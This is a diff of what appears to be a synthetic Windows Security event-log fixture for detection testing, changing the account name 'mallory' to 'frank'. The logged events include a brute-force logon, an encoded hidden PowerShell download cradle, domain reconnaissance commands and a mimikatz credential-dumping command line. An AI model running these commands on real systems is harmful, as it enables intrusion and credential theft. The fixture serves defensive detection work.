@@ -1501,7 +1501,7 @@
     "EventID": 4625,
     "Channel": "Security",
     "TargetDomainName": "CORP",
-    "TargetUserName": "mallory",
+    "TargetUserName": "frank",
     "TargetLogonId": "0x0",
     "LogonType": 3,
     "IpAddress": "203.0.113.66",
@@ -1510,7 +1510,7 @@
     "ProcessName": "-",
     "SubjectUserName": "-",
     "SubjectLogonId": "0x0",
-    "raw_message": "An account failed to log on.\n  Account Name: mallory\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
+    "raw_message": "An account failed to log on.\n  Account Name: frank\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
   },
   {
     "@timestamp": "2026-04-01T12:12:07Z",
@@ -1518,7 +1518,7 @@
     "EventID": 4625,
     "Channel": "Security",
     "TargetDomainName": "CORP",
-    "TargetUserName": "mallory",
+    "TargetUserName": "frank",
     "TargetLogonId": "0x0",
     "LogonType": 3,
     "IpAddress": "203.0.113.66",
@@ -1527,7 +1527,7 @@
     "ProcessName": "-",
     "SubjectUserName": "-",
     "SubjectLogonId": "0x0",
-    "raw_message": "An account failed to log on.\n  Account Name: mallory\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
+    "raw_message": "An account failed to log on.\n  Account Name: frank\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
   },
   {
     "@timestamp": "2026-04-01T12:12:14Z",
@@ -1535,7 +1535,7 @@
     "EventID": 4625,
     "Channel": "Security",
     "TargetDomainName": "CORP",
-    "TargetUserName": "mallory",
+    "TargetUserName": "frank",
     "TargetLogonId": "0x0",
     "LogonType": 3,
     "IpAddress": "203.0.113.66",
@@ -1544,7 +1544,7 @@
     "ProcessName": "-",
     "SubjectUserName": "-",
     "SubjectLogonId": "0x0",
-    "raw_message": "An account failed to log on.\n  Account Name: mallory\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
+    "raw_message": "An account failed to log on.\n  Account Name: frank\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
   },
   {
     "@timestamp": "2026-04-01T12:12:21Z",
@@ -1552,7 +1552,7 @@
     "EventID": 4625,
     "Channel": "Security",
     "TargetDomainName": "CORP",
-    "TargetUserName": "mallory",
+    "TargetUserName": "frank",
     "TargetLogonId": "0x0",
     "LogonType": 3,
     "IpAddress": "203.0.113.66",
@@ -1561,7 +1561,7 @@
     "ProcessName": "-",
     "SubjectUserName": "-",
     "SubjectLogonId": "0x0",
-    "raw_message": "An account failed to log on.\n  Account Name: mallory\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
+    "raw_message": "An account failed to log on.\n  Account Name: frank\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
   },
   {
     "@timestamp": "2026-04-01T12:12:28Z",
@@ -1569,7 +1569,7 @@
     "EventID": 4625,
     "Channel": "Security",
     "TargetDomainName": "CORP",
-    "TargetUserName": "mallory",
+    "TargetUserName": "frank",
     "TargetLogonId": "0x0",
     "LogonType": 3,
     "IpAddress": "203.0.113.66",
@@ -1578,7 +1578,7 @@
     "ProcessName": "-",
     "SubjectUserName": "-",
     "SubjectLogonId": "0x0",
-    "raw_message": "An account failed to log on.\n  Account Name: mallory\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
+    "raw_message": "An account failed to log on.\n  Account Name: frank\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
   },
   {
     "@timestamp": "2026-04-01T12:12:35Z",
@@ -1586,7 +1586,7 @@
     "EventID": 4625,
     "Channel": "Security",
     "TargetDomainName": "CORP",
-    "TargetUserName": "mallory",
+    "TargetUserName": "frank",
     "TargetLogonId": "0x0",
     "LogonType": 3,
     "IpAddress": "203.0.113.66",
@@ -1595,7 +1595,7 @@
     "ProcessName": "-",
     "SubjectUserName": "-",
     "SubjectLogonId": "0x0",
-    "raw_message": "An account failed to log on.\n  Account Name: mallory\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
+    "raw_message": "An account failed to log on.\n  Account Name: frank\n  Account Domain: CORP\nFailure Information:\n  Sub Status: 0xC000006A\nLogon Type: 3\n  Source Network Address: 203.0.113.66"
   },
   {
     "@timestamp": "2026-04-01T12:13:00Z",
@@ -1603,7 +1603,7 @@
     "EventID": 4624,
     "Channel": "Security",
     "TargetDomainName": "CORP",
-    "TargetUserName": "mallory",
+    "TargetUserName": "frank",
     "TargetLogonId": "0x21F8AC6",
     "LogonType": 3,
     "IpAddress": "203.0.113.66",
@@ -1612,7 +1612,7 @@
     "ProcessName": "-",
     "SubjectUserName": "-",
     "SubjectLogonId": "0x0",
-    "raw_message": "An account was successfully logged on.\nSubject:\n  Account Name: -\n  Logon ID: 0x0\nNew Logon:\n  Account Name: mallory\n  Account Domain: CORP\n  Logon ID: 0x21F8AC6\n  Logon GUID: {EEEA163E-2338-7D12-BD32-50C448F4EF12}\nLogon Type: 3\nNetwork Information:\n  Workstation Name: ATTACKER\n  Source Network Address: 203.0.113.66"
+    "raw_message": "An account was successfully logged on.\nSubject:\n  Account Name: -\n  Logon ID: 0x0\nNew Logon:\n  Account Name: frank\n  Account Domain: CORP\n  Logon ID: 0x21F8AC6\n  Logon GUID: {EEEA163E-2338-7D12-BD32-50C448F4EF12}\nLogon Type: 3\nNetwork Information:\n  Workstation Name: ATTACKER\n  Source Network Address: 203.0.113.66"
   },
   {
     "@timestamp": "2026-04-01T12:13:02Z",
@@ -1620,10 +1620,10 @@
     "EventID": 4672,
     "Channel": "Security",
     "TargetDomainName": "CORP",
-    "SubjectUserName": "mallory",
+    "SubjectUserName": "frank",
     "SubjectLogonId": "0x21F8AC6",
     "PrivilegeList": "SeDebugPrivilege,SeImpersonatePrivilege,SeTcbPrivilege",
-    "raw_message": "Special privileges assigned to new logon.\n  Account Name: mallory\n  Logon ID: 0x21F8AC6\n  Privileges: SeDebugPrivilege,SeImpersonatePrivilege,SeTcbPrivilege"
+    "raw_message": "Special privileges assigned to new logon.\n  Account Name: frank\n  Logon ID: 0x21F8AC6\n  Privileges: SeDebugPrivilege,SeImpersonatePrivilege,SeTcbPrivilege"
   },
   {
     "@timestamp": "2026-04-01T12:13:15Z",
@@ -1631,12 +1631,12 @@
     "EventID": 4688,
     "Channel": "Security",
     "TargetDomainName": "CORP",
-    "SubjectUserName": "mallory",
+    "SubjectUserName": "frank",
     "SubjectLogonId": "0x21F8AC6",
     "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
     "CommandLine": "cmd.exe /c whoami /all",
     "ParentProcessName": "C:\\Windows\\System32\\services.exe",
-    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: mallory\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\cmd.exe\n  Command Line: cmd.exe /c whoami /all\n  Creator Process Name: C:\\Windows\\System32\\services.exe"
+    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: frank\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\cmd.exe\n  Command Line: cmd.exe /c whoami /all\n  Creator Process Name: C:\\Windows\\System32\\services.exe"
   },
   {
     "@timestamp": "2026-04-01T12:13:25Z",
@@ -1644,12 +1644,12 @@
     "EventID": 4688,
     "Channel": "Security",
     "TargetDomainName": "CORP",
-    "SubjectUserName": "mallory",
+    "SubjectUserName": "frank",
     "SubjectLogonId": "0x21F8AC6",
     "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
     "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
     "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
-    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: mallory\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  Command Line: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\n  Creator Process Name: C:\\Windows\\System32\\cmd.exe"
+    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: frank\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  Command Line: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\n  Creator Process Name: C:\\Windows\\System32\\cmd.exe"
   },
   {
     "@timestamp": "2026-04-01T12:13:36Z",
@@ -1657,12 +1657,12 @@
     "EventID": 4688,
     "Channel": "Security",
     "TargetDomainName": "CORP",
-    "SubjectUserName": "mallory",
+    "SubjectUserName": "frank",
     "SubjectLogonId": "0x21F8AC6",
     "NewProcessName": "C:\\Windows\\System32\\net.exe",
     "CommandLine": "net.exe view /domain",
     "ParentProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: mallory\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\net.exe\n  Command Line: net.exe view /domain\n  Creator Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: frank\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\net.exe\n  Command Line: net.exe view /domain\n  Creator Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
   },
   {
     "@timestamp": "2026-04-01T12:13:43Z",
@@ -1670,12 +1670,12 @@
     "EventID": 4688,
     "Channel": "Security",
     "TargetDomainName": "CORP",
-    "SubjectUserName": "mallory",
+    "SubjectUserName": "frank",
     "SubjectLogonId": "0x21F8AC6",
     "NewProcessName": "C:\\Windows\\System32\\net.exe",
     "CommandLine": "net.exe group \"Domain Admins\" /domain",
     "ParentProcessName": "C:\\Windows\\System32\\net.exe",
-    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: mallory\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\net.exe\n  Command Line: net.exe group \"Domain Admins\" /domain\n  Creator Process Name: C:\\Windows\\System32\\net.exe"
+    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: frank\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\net.exe\n  Command Line: net.exe group \"Domain Admins\" /domain\n  Creator Process Name: C:\\Windows\\System32\\net.exe"
   },
   {
     "@timestamp": "2026-04-01T12:13:55Z",
@@ -1683,12 +1683,12 @@
     "EventID": 4688,
     "Channel": "Security",
     "TargetDomainName": "CORP",
-    "SubjectUserName": "mallory",
+    "SubjectUserName": "frank",
     "SubjectLogonId": "0x21F8AC6",
     "NewProcessName": "C:\\Windows\\System32\\ipconfig.exe",
     "CommandLine": "ipconfig.exe /all",
     "ParentProcessName": "C:\\Windows\\System32\\net.exe",
-    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: mallory\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\ipconfig.exe\n  Command Line: ipconfig.exe /all\n  Creator Process Name: C:\\Windows\\System32\\net.exe"
+    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: frank\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\ipconfig.exe\n  Command Line: ipconfig.exe /all\n  Creator Process Name: C:\\Windows\\System32\\net.exe"
   },
   {
     "@timestamp": "2026-04-01T12:14:06Z",
@@ -1696,12 +1696,12 @@
     "EventID": 4688,
     "Channel": "Security",
     "TargetDomainName": "CORP",
-    "SubjectUserName": "mallory",
+    "SubjectUserName": "frank",
     "SubjectLogonId": "0x21F8AC6",
     "NewProcessName": "C:\\Tools\\mimikatz.exe",
     "CommandLine": "mimikatz.exe sekurlsa::logonpasswords exit",
     "ParentProcessName": "C:\\Windows\\System32\\ipconfig.exe",
-    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: mallory\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Tools\\mimikatz.exe\n  Command Line: mimikatz.exe sekurlsa::logonpasswords exit\n  Creator Process Name: C:\\Windows\\System32\\ipconfig.exe"
+    "raw_message": "A new process has been created.\nCreator Subject:\n  Account Name: frank\n  Logon ID: 0x21F8AC6\nProcess Information:\n  New Process Name: C:\\Tools\\mimikatz.exe\n  Command Line: mimikatz.exe sekurlsa::logonpasswords exit\n  Creator Process Name: C:\\Windows\\System32\\ipconfig.exe"
   },
   {
     "@timestamp": "2026-04-01T12:14:14Z",
